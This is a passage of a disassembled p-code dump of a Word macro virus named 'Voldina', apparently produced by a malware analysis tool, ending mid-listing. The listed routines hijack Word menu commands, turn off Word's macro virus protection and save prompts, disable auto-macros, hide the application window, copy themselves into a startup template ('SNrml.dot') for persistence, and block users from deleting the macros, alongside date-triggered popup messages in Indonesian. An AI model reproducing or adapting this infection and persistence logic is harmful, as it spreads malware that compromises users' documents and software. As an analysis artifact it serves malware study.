' 	Ld AddIns 
' 	ArgsMemCall Unlock 0x0001 
' Line #159:
' 	ArgsCall WBF 0x0000 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #162:
' 	EndSub 
' Line #163:
' 	FuncDefn (Sub AutoExit())
' Line #164:
' 	Dim 
' 	VarDefn aAddin (As Object)
' Line #165:
' 	OnError batal 
' Line #166:
' 	ArgsCall WBT 0x0000 
' Line #167:
' 	Ld Documents 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Documents 
' 	ArgsMemCall Close 0x0000 
' 	EndIf 
' Line #168:
' 	LitDI2 0x0006 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitDI2 0x0002 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #169:
' 	LitVarSpecial (True)
' 	St afound 
' Line #170:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	Ld AddIns 
' 	ForEach 
' Line #171:
' 	Ld aAddin 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St afound 
' 	EndIf 
' Line #172:
' 	StartForVariable 
' 	Ld aAddin 
' 	EndForVariable 
' 	NextVar 
' Line #173:
' Line #174:
' 	Ld afound 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #175:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt Visible 
' Line #176:
' 	Ld Documents 
' 	ArgsMemCall Add 0x0000 
' Line #177:
' 	ArgsCall AstMaster 0x0000 
' Line #178:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #179:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.src"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #180:
' 	LitDI2 0x0008 
' 	Ld Options 
' 	ArgsMemLd DefaultFilePath 0x0001 
' 	LitStr 0x000A "\SNrml.dot"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	ArgsMemCallWith SaveAs 0x0003 
' Line #181:
' 	EndWith 
' Line #182:
' 	EndIfBlock 
' Line #183:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #184:
' 	Label batal 
' Line #185:
' 	ArgsCall WBF 0x0000 
' Line #186:
' 	EndSub 
' Line #187:
' 	FuncDefn (Sub HelpAbout())
' Line #188:
' 	OnError voldna 
' Line #189:
' 	LitDI2 0x0003 
' 	St btk 
' Line #190:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #191:
' 	Label voldna 
' Line #192:
' 	EndSub 
' Line #193:
' 	FuncDefn (Sub FileClose())
' Line #194:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	IfBlock 
' Line #195:
' 	LitDI2 0x0002 
' 	St btk 
' Line #196:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #197:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #198:
' 	LitDI2 0x0002 
' 	St btk 
' Line #199:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #200:
' 	ElseBlock 
' Line #201:
' 	EndIfBlock 
' Line #202:
' 	EndSub 
' Line #203:
' 	FuncDefn (Sub ToolsMacro())
' Line #204:
' 	ArgsCall WBF 0x0000 
' Line #205:
' 	OnError batal 
' Line #206:
' 	Ld ActiveDocument 
' 	ArgsCall Mhapus 0x0001 
' Line #207:
' 	Ld NonVoldina 
' 	IfBlock 
' Line #208:
' 	Ld MacroContainer 
' 	Ld ActiveDocument 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd New 
' 	LitStr 0x0014 ".Angelina.ToolsMacro"
' 	Concat 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' 	BoS 0x0000 
' 	ExitSub 
' 	EndIf 
' Line #209:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #210:
' 	StartWithExpr 
' 	LitDI2 0x00D7 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #211:
' 	LitStr 0x0076 "Macros Voldina mungkin tidak bisa Anda hapus, Anda hanya bisa menghapus makro buatan Anda (Descr: 'Makro non-Voldina')"
' 	MemStWith Description 
' Line #212:
' 	MemLdWith Display 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsMemCallWith Execute 0x0000 
' 	EndIf 
' Line #213:
' 	EndWith 
' Line #214:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #215:
' 	ElseBlock 
' Line #216:
' 	ArgsCall ViewVBCode 0x0000 
' Line #217:
' 	EndIfBlock 
' Line #218:
' 	Label batal 
' Line #219:
' 	EndSub 
' Line #220:
' 	FuncDefn (Sub FileTemplates())
' Line #221:
' 	ArgsCall WBF 0x0000 
' Line #222:
' 	Ld reset 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0057 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Display 0x0000 
' 	EndIf 
' Line #223:
' 	EndSub 
' Line #224:
' 	FuncDefn (Sub FormatStyle())
' Line #225:
' 	ArgsCall WBF 0x0000 
' Line #226:
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #227:
' 	EndSub 
' Line #228:
' 	FuncDefn (Function Refresh())
' Line #229:
' 	LitVarSpecial (True)
' 	St reset 
' Line #230:
' 	ArgsCall FileTemplates 0x0000 
' Line #231:
' 	Ld aDes 
' 	ArgsCall Mhapus 0x0001 
' Line #232:
' 	EndFunc 
' Line #233:
' 	FuncDefn (Sub AutoClose())
' Line #234:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #235:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #236:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #237:
' 	LitDI2 0x000A 
' 	MemStWith SaveInterval 
' Line #238:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #239:
' 	EndWith 
' Line #240:
' 	LineCont 0x0004 15 00 00 00
' 	Ld ActiveWindow 
' 	MemLd Caption 
' 	LitStr 0x0007 "Voldina"
' 	Ne 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0006 "Docume"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	LitDI2 0x0000 
' 	Eq 
' 	And 
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitStr 0x0009 "SNrml.dot"
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	ArgsCall AstMaster 0x0000 
' 	EndIf 
' Line #241:
' 	EndSub 
' Line #242:
' 	FuncDefn (Sub FileExit())
' Line #243:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	IfBlock 
' Line #244:
' 	LitDI2 0x0002 
' 	St btk 
' Line #245:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #246:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	Paren 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	Paren 
' 	And 
' 	ElseIfBlock 
' Line #247:
' 	LitDI2 0x0002 
' 	St btk 
' Line #248:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #249:
' 	ElseBlock 
' Line #250:
' 	EndIfBlock 
' Line #251:
' 	ArgsCall AutoExit 0x0000 
' Line #252:
' 	EndSub 
' Line #253:
' 	FuncDefn (Sub ToolsOptions())
' Line #254:
' 	LitStr 0x002B "C:\Program Files\Microsoft Office\Templates"
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #255:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #256:
' 	Ld Application 
' 	MemLd Path 
' 	Ld wdUserTemplatesPath 
' 	Ld Options 
' 	ArgsMemSt DefaultFilePath 0x0001 
' Line #257:
' 	EndSub 
' Line #258:
' 	FuncDefn (Function WBT())
' Line #259:
' 	LitVarSpecial (True)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #260:
' 	EndFunc 
' Line #261:
' 	FuncDefn (Function WBF())
' Line #262:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #263:
' 	EndFunc 
' Line #264:
' Line #265:
' Line #266:
' Line #267:
' Line #268:
' Line #269:
' Line #270:
' Line #271:
' Line #272:
' Line #273:
' Line #274:
' Line #275:
' 	QuoteRem 0x0000 0x0020 "This macros created & inspirated"
' Line #276:
' 	QuoteRem 0x0000 0x0018 "when my specials friends"
' Line #277:
' 	QuoteRem 0x0000 0x0016 "celebrate her birthday"
' Line #278:
' 	QuoteRem 0x0000 0x0011 " January 16, 1999"
' Line #279:
' Line #280:
' 	QuoteRem 0x0000 0x001C "This is special gift for you"
' Line #281:
' 	QuoteRem 0x0000 0x0026 "######################################"
' Line #282:
' 	QuoteRem 0x0000 0x001B " I HOPE YOU REMEMBER FOR ME"
' Line #283:
' 	QuoteRem 0x0000 0x001B " EVEN YOU HAPPY WITH OTHERS"
' Line #284:
' 	QuoteRem 0x0000 0x000C " NEW FRIENDS"
' Line #285:
' 	QuoteRem 0x0000 0x0025 "                        ....fhrazzthy"
' Line #286:
' 	QuoteRem 0x0000 0x0026 "######################################"
' Line #287:
' 	QuoteRem 0x0000 0x0019 "fhrazzthy@most-wanted.com"
' Line #288:
' Line #289:
' Line #290:
' Line #291:
' Line #292:
' Line #293:
' Line #294:
' Macros/VBA/Voldina - 11841 bytes
' Line #0:
' Line #1:
' Line #2:
' Line #3:
' Line #4:
' Line #5:
' Line #6:
' Line #7:
' Line #8:
' Line #9:
' Line #10:
' Line #11:
' Line #12:
' Line #13:
' Line #14:
' Line #15:
' Line #16:
' Line #17:
' Line #18:
' Line #19:
' Line #20:
' Line #21:
' Line #22:
' Line #23:
' Line #24:
' Line #25:
' Line #26:
' Line #27:
' Line #28:
' Line #29:
' Line #30:
' Line #31:
' Line #32:
' Line #33:
' Line #34:
' Line #35:
' Line #36:
' Line #37:
' Line #38:
' Line #39:
' Line #40:
' Line #41:
' Line #42:
' Line #43:
' Line #44:
' Line #45:
' 	Dim 
' 	OptionBase 
' 	LitDI2 0x0006 
' 	VarDefn Teks (As String)
' Line #46:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #47:
' 	Do 
' Line #48:
' 	StartWithExpr 
' 	Ld Voldina 
' 	With 
' Line #49:
' 	MemLdWith Height 
' 	LitDI2 0x000A 
' 	Sub 
' 	MemStWith Height 
' Line #50:
' 	MemLdWith With 
' 	LitDI2 0x000F 
' 	Sub 
' 	MemStWith With 
' Line #51:
' 	MemLdWith Height 
' 	LitDI2 0x0019 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #52:
' 	EndWith 
' Line #53:
' 	ArgsCall Beep 0x0000 
' Line #54:
' 	Loop 
' Line #55:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #56:
' 	EndSub 
' Line #57:
' Line #58:
' 	FuncDefn (Private Sub CommandButton2_Click())
' Line #59:
' 	Do 
' Line #60:
' 	StartWithExpr 
' 	Ld Voldina 
' 	With 
' Line #61:
' 	MemLdWith Height 
' 	LitDI2 0x000A 
' 	Sub 
' 	MemStWith Height 
' Line #62:
' 	MemLdWith With 
' 	LitDI2 0x000F 
' 	Sub 
' 	MemStWith With 
' Line #63:
' 	MemLdWith Height 
' 	LitDI2 0x0019 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #64:
' 	EndWith 
' Line #65:
' 	ArgsCall Beep 0x0000 
' Line #66:
' 	Loop 
' Line #67:
' 	Ld id_FFFF 
' 	ArgsCall Unlock 0x0001 
' Line #68:
' 	LitDI2 0x0003 
' 	St btk 
' Line #69:
' 	Ld Voldina 
' 	ArgsMemCall Show 0x0000 
' Line #70:
' 	EndSub 
' Line #71:
' Line #72:
' Line #73:
' Line #74:
' 	FuncDefn (Private Sub Image6_Click())
' Line #75:
' Line #76:
' 	EndSub 
' Line #77:
' Line #78:
' 	FuncDefn (Private Sub UserForm_Activate())
' Line #79:
' 	Ld btk 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #80:
' 	ArgsCall Ulang 0x0000 
' Line #81:
' 	Ld btk 
' 	LitDI2 0x0001 
' 	Eq 
' 	ElseIfBlock 
' Line #82:
' 	ArgsCall TT 0x0000 
' Line #83:
' 	Ld btk 
' 	LitDI2 0x0003 
' 	Eq 
' 	ElseIfBlock 
' Line #84:
' 	ArgsCall Wly 0x0000 
' Line #85:
' 	ElseBlock 
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	EndSub 
' Line #88:
' 	FuncDefn (Sub Wly())
' Line #89:
' 	StartWithExpr 
' 	Ld Voldina 
' 	With 
' Line #90:
' 	Ld With 
' 	LitDI2 0x00C8 
' 	Sub 
' 	MemStWith With 
' Line #91:
' 	LitStr 0x0011 "F.h.r.a.z.z.t.h.y"
' 	MemStWith Caption 
' Line #92:
' 	LitDI2 0x0001 
' 	MemStWith StartUpPosition 
' Line #93:
' 	EndWith 
' Line #94:
' 	LitVarSpecial (False)
' 	Ld Image1 
' 	MemSt Visible 
' Line #95:
' 	LitVarSpecial (True)
' 	Ld Image3 
' 	MemSt Visible 
' Line #96:
' 	LitVarSpecial (True)
' 	Ld Image4 
' 	MemSt Visible 
' Line #97:
' 	LitVarSpecial (False)
' 	Ld Image5 
' 	MemSt Visible 
' Line #98:
' 	LitVarSpecial (True)
' 	Ld Image6 
' 	MemSt Visible 
' Line #99:
' 	LitVarSpecial (False)
' 	Ld Label8 
' 	MemSt Visible 
' Line #100:
' 	LitVarSpecial (False)
' 	Ld Label4 
' 	MemSt Visible 
' Line #101:
' 	LitVarSpecial (True)
' 	Ld Label9 
' 	MemSt Visible 
' Line #102:
' 	LitVarSpecial (True)
' 	Ld Label7 
' 	MemSt Visible 
' Line #103:
' Line #104:
' 	LitVarSpecial (False)
' 	Ld CommandButton2 
' 	MemSt Visible 
' Line #105:
' Line #106:
' 	EndSub 
' Line #107:
' 	FuncDefn (Sub TT())
' Line #108:
' 	Dim 
' 	VarDefn a (As Byte)
' 	VarDefn diam (As Boolean)
' Line #109:
' 	Dim 
' 	VarDefn tp
' 	VarDefn tm
' 	VarDefn sel
' 	VarDefn i
' Line #110:
' Line #111:
' 	LitVarSpecial (False)
' 	Ld Image3 
' 	MemSt Visible 
' Line #112:
' 	LitVarSpecial (False)
' 	Ld Image4 
' 	MemSt Visible 
' Line #113:
' 	LitVarSpecial (False)
' 	Ld Image6 
' 	MemSt Visible 
' Line #114:
' 	LitVarSpecial (False)
' 	Ld Label9 
' 	MemSt Visible 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Image6 
' 	MemSt Visible 
' Line #116:
' 	LitVarSpecial (False)
' 	Ld Label7 
' 	MemSt Visible 
' Line #117:
' 	LitVarSpecial (False)
' 	Ld Image5 
' 	MemSt Visible 
' Line #118:
' 	LitVarSpecial (False)
' 	Ld Label8 
' 	MemSt Visible 
' Line #119:
' Line #120:
' 	LitDI2 0x0001 
' 	St a 
' Line #121:
' 	LitVarSpecial (True)
' 	St diam 
' Line #122:
' 	LitVarSpecial (False)
' 	Ld Voldina 
' 	MemSt Enabled 
' Line #123:
' 	LitVarSpecial (False)
' 	Ld Label3 
' 	MemSt Visible 
' Line #124:
' 	Do 
' Line #125:
' 	ArgsCall DoEvents 0x0000 
' Line #126:
' 	Ld Timer 
' 	Ld tm 
' 	Sub 
' 	St sel 
' Line #127:
' 	Ld tp 
' 	LitDI2 0x0001 
' 	Add 
' 	St tp 
' Line #128:
' 	Ld tp 
' 	LitDI2 0x012C 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #129:
' 	Ld Voldina 
' 	MemLd BackColor 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #130:
' 	EndIfBlock 
' Line #131:
' 	Ld tp 
' 	LitDI2 0x0258 
' 	Mod 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #132:
' 	LitHI4 0x0009 0x8000 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #133:
' 	EndIfBlock 
' Line #134:
' 	Ld sel 
' 	LitR8 0x999A 0x9999 0x9999 0x3FB9 
' 	Gt 
' 	IfBlock 
' Line #135:
' 	Ld Timer 
' 	St tm 
' Line #136:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #137:
' 	Ld a 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0010 
' 	Ld Label1 
' 	MemLd Font 
' 	MemSt Size 
' 	BoS 0x0000 
' 	Ld Image1 
' 	MemLd With 
' 	Ld Label1 
' 	MemSt With 
' 	EndIf 
' Line #138:
' 	Ld Label1 
' 	MemLd Caption 
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	Ld Label1 
' 	MemSt Caption 
' Line #139:
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0004 "[! ]"
' 	Like 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Beep 0x0000 
' 	EndIf 
' Line #140:
' 	Ld Label1 
' 	MemLd Caption 
' 	FnLen 
' 	Ld a 
' 	ArgsLd Teks 0x0001 
' 	FnLen 
' 	Eq 
' 	IfBlock 
' Line #141:
' 	Ld diam 
' 	IfBlock 
' Line #142:
' 	Do 
' Line #143:
' 	Ld Timer 
' 	Ld tm 
' 	Sub 
' 	LitDI2 0x0001 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	ExitDo 
' 	EndIf 
' Line #144:
' 	ArgsCall DoEvents 0x0000 
' Line #145:
' 	Ld Voldina 
' 	MemLd BackColor 
' 	Ld Label4 
' 	MemSt ForeColor 
' Line #146:
' 	Loop 
' Line #147:
' 	LitVarSpecial (False)
' 	St diam 
' Line #148:
' 	Ld a 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo catat 
' 	EndIf 
' Line #149:
' 	EndIfBlock 
' Line #150:
' 	Ld Label2 
' 	MemLd LBound 
' 	LitDI2 0x0009 
' 	Sub 
' 	Ld Label2 
' 	ArgsMemCall Move 0x0001 
' Line #151:
' 	Ld Label2 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd LBound 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	GoSub catat 
' 	EndIf 
' Line #152:
' 	EndIfBlock 
' Line #153:
' 	EndIfBlock 
' Line #154:
' 	Loop 
' Line #155:
' 	ExitSub 
' Line #156:
' 	Label catat 
' Line #157:
' 	Ld a 
' 	LitDI2 0x0007 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0000 ""
' 	Ld Label1 
' 	MemSt Caption 
' 	EndIf 
' Line #158:
' 	Ld Timer 
' 	St tm 
' Line #159:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd With 
' 	Add 
' 	Ld Label2 
' 	MemSt LBound 
' Line #160:
' 	Ld a 
' 	LitDI2 0x0001 
' 	Add 
' 	St a 
' Line #161:
' 	LitDI2 0x0000 
' 	St i 
' Line #162:
' 	LitVarSpecial (True)
' 	St diam 
' Line #163:
' 	Ld a 
' 	LitDI2 0x0007 
' 	Eq 
' 	IfBlock 
' Line #164:
' 	LitVarSpecial (True)
' 	Ld Label4 
' 	MemSt Visible 
' Line #165:
' 	LitVarSpecial (True)
' 	Ld Image1 
' 	MemSt Visible 
' Line #166:
' 	LitVarSpecial (True)
' 	Ld Voldina 
' 	MemSt Enabled 
' Line #167:
' 	LitVarSpecial (True)
' 	Ld Label3 
' 	MemSt Visible 
' Line #168:
' 	Ld CommandButton1 
' 	ArgsMemCall SetFocus 0x0000 
' Line #169:
' 	LineCont 0x0004 0C 00 0C 00
' 	LitStr 0x0000 ""
' 	LitStr 0x0027 "HKEY_CURRENT_USER\Control Panel\desktop"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	ArgsLd LoadPicture 0x0001 
' 	Ld Image1 
' 	MemSt Picture 
' Line #170:
' 	ExitSub 
' Line #171:
' 	EndIfBlock 
' Line #172:
' 	Return 
' Line #173:
' 	EndSub 
' Line #174:
' Line #175:
' Line #176:
' Line #177:
' Line #178:
' Line #179:
' 	FuncDefn (Private Sub UserForm_Layout())
' Line #180:
' 	Dim 
' 	VarDefn waktu
' 	VarDefn saat
' Line #181:
' 	Ld Time 
' 	LitStr 0x0002 "hh"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	St waktu 
' Line #182:
' 	Ld waktu 
' 	SelectCase 
' Line #183:
' 	LitDI2 0x0000 
' 	LitDI2 0x0008 
' 	CaseTo 
' 	CaseDone 
' Line #184:
' 	LitStr 0x0004 "pagi"
' 	St saat 
' Line #185:
' 	LitDI2 0x0009 
' 	LitDI2 0x000E 
' 	CaseTo 
' 	CaseDone 
' Line #186:
' 	LitStr 0x0005 "siang"
' 	St saat 
' Line #187:
' 	LitDI2 0x000F 
' 	LitDI2 0x0011 
' 	CaseTo 
' 	CaseDone 
' Line #188:
' 	LitStr 0x0004 "sore"
' 	St saat 
' Line #189:
' 	LitDI2 0x0012 
' 	LitDI2 0x0017 
' 	CaseTo 
' 	CaseDone 
' Line #190:
' 	LitStr 0x0005 "malam"
' 	St saat 
' Line #191:
' 	CaseElse 
' Line #192:
' 	LitVarSpecial (False)
' 	Ld Label4 
' 	MemSt Visible 
' Line #193:
' 	EndSelect 
' Line #194:
' Line #195:
' 	LitStr 0x0036 "Mas Yudi sayangku maaf bila hal ini akan mengganggumu "
' 	LitDI2 0x0001 
' 	ArgsSt Teks 0x0001 
' Line #196:
' 	LitStr 0x0049 "Karena hanya dengan inilah dinda mengingatkan akan wajahku yang manis ini"
' 	LitDI2 0x0002 
' 	ArgsSt Teks 0x0001 
' Line #197:
' 	LitStr 0x002F "S'bab kutahu  kalau kamu sering lirik sana-sini"
' 	LitDI2 0x0003 
' 	ArgsSt Teks 0x0001 
' Line #198:
' 	LitStr 0x0039 "Tapi akoe sangat maklum akan tugasmu ini penuh dengan SLI"
' 	LitDI2 0x0004 
' 	ArgsSt Teks 0x0001 
' Line #199:
' 	LitStr 0x0038 "Yang Kumau agar kamu S'lalu ingat akan cantiknya parasku"
' 	LitDI2 0x0005 
' 	ArgsSt Teks 0x0001 
' Line #200:
' 	LitStr 0x0029 "Salam sayang dariku hanya untukmu seorang"
' 	LitDI2 0x0006 
' 	ArgsSt Teks 0x0001 
' Line #201:
' 	Ld Label1 
' 	MemLd LBound 
' 	Ld Label1 
' 	MemLd With 
' 	Add 
' 	Ld Label2 
' 	MemSt LBound 
' Line #202:
' 	LitStr 0x0019 "Hacked by : Fhrazzthy '96"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000C "Thanks to : "
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	Ld Label3 
' 	MemSt Caption 
' Line #203:
' 	LitStr 0x0008 "Selamat "
' 	Ld saat 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x000A "Maaf bila "
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0011 " merasa terganggu"
' 	Concat 
' 	Ld Label4 
' 	MemSt Caption 
' Line #204:
' 	EndSub 
' Line #205:
' 	FuncDefn (Private Sub UserForm_Terminate())
' Line #206:
' 	Dim 
' 	VarDefn i (As Integer)
' Line #207:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' Line #208:
' 	ArgsCall Beep 0x0000 
' Line #209:
' 	StartForVariable 
' 	Next 
' Line #210:
' 	EndSub 
' Line #211:
' 	FuncDefn (Sub Ulang())
' Line #212:
' 	Dim 
' 	VarDefn waktu
' 	VarDefn bln
' 	VarDefn kt
' Line #213:
' 	StartWithExpr 
' 	Ld Voldina 
' 	With 
' Line #214:
' 	Ld With 
' 	LitDI2 0x00C8 
' 	Sub 
' 	MemStWith With 
' Line #215:
' 	LitStr 0x000E "Happy Birthday"
' 	MemStWith Caption 
' Line #216:
' 	LitDI2 0x0001 
' 	MemStWith StartUpPosition 
' Line #217:
' 	EndWith 
' Line #218:
' 	LitVarSpecial (False)
' 	Ld Image1 
' 	MemSt Visible 
' Line #219:
' 	LitVarSpecial (False)
' 	Ld Image2 
' 	MemSt Visible 
' Line #220:
' 	LitVarSpecial (False)
' 	Ld Image3 
' 	MemSt Visible 
' Line #221:
' 	LitVarSpecial (False)
' 	Ld Image4 
' 	MemSt Visible 
' Line #222:
' 	LitVarSpecial (False)
' 	Ld Image6 
' 	MemSt Visible 
' Line #223:
' 	LitVarSpecial (False)
' 	Ld Label4 
' 	MemSt Visible 
' Line #224:
' 	LitVarSpecial (False)
' 	Ld Label9 
' 	MemSt Visible 
' Line #225:
' 	LitVarSpecial (False)
' 	Ld Label7 
' 	MemSt Visible 
' Line #226:
' Line #227:
' 	LitVarSpecial (False)
' 	Ld CommandButton2 
' 	MemSt Visible 
' Line #228:
' Line #229:
' 	LitVarSpecial (True)
' 	Ld Image5 
' 	MemSt Visible 
' Line #230:
' 	LitVarSpecial (True)
' 	Ld Label8 
' 	MemSt Visible 
' Line #231:
' Line #232:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	ArgsLd Val 0x0001 
' 	St kt 
' Line #233:
' 	Ld kt 
' 	SelectCase 
' Line #234:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "sebulan yang lalu"
' 	St bln 
' Line #235:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0012 "2 bulan yang lewat"
' 	St bln 
' Line #236:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "3 bulan yang lalu"
' 	St bln 
' Line #237:
' 	LitDI2 0x0005 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000F "4 bulan kemarin"
' 	St bln 
' Line #238:
' 	LitDI2 0x0006 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000C "5 bulan lalu"
' 	St bln 
' Line #239:
' 	LitDI2 0x0007 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0013 "setengah tahun lagi"
' 	St bln 
' Line #240:
' 	LitDI2 0x0008 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000F "5 bulan kedepan"
' 	St bln 
' Line #241:
' 	LitDI2 0x0009 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0011 "4 bulan mendatang"
' 	St bln 
' Line #242:
' 	LitDI2 0x000A 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000C "3 bulan lagi"
' 	St bln 
' Line #243:
' 	LitDI2 0x000B 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x0014 "tinggal 2 bulan lagi"
' 	St bln 
' Line #244:
' 	LitDI2 0x000C 
' 	Case 
' 	CaseDone 
' 	BoS 0x0000 
' 	LitStr 0x000C "sebulan lagi"
' 	St bln 
' Line #245:
' 	EndSelect 
' Line #246:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x0010 
' 	Eq 
' 	Ld Now 
' 	ArgsLd Month 0x0001 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #247:
' 	LitVarSpecial (True)
' 	Ld Image5 
' 	MemSt Visible 
' Line #248:
' 	LitVarSpecial (False)
' 	Ld Label8 
' 	MemSt Visible 
' Line #249:
